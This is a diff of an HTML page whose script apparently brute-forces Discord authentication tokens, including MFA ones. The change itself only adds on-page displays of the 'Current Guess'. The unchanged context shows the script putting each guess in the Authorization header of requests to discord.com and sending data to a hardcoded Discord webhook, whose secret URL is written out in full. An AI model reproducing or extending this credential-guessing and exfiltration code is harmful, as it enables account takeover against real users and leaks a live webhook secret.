@@ -46,6 +46,7 @@
           fetch("https://discord.com/api/webhooks/934827543922634762/PQiPILZqyDyLtKZEu8v1dL22xlPtpNL8qmsMFqxO5e0Ci4L1sncCnc35WtJGdn9MgMh3", requestOptions).then(response => response.text())
         }
       })
+      document.getElementById('Guess').content = guess
       token = gettoken2()
       fetch('https://discord.com/login', {'headers':{
         'Authorization': guess
@@ -69,5 +70,8 @@
         }
       })
     }
+    document.getElementById('GuessMFA').content = guess
   </script>
+  Current Guess: <div id='Guess'>Joe Mama</div>
+  Current Guess (mfa): <div id='GuessMFA'>Joe Mama</div>
 </html>
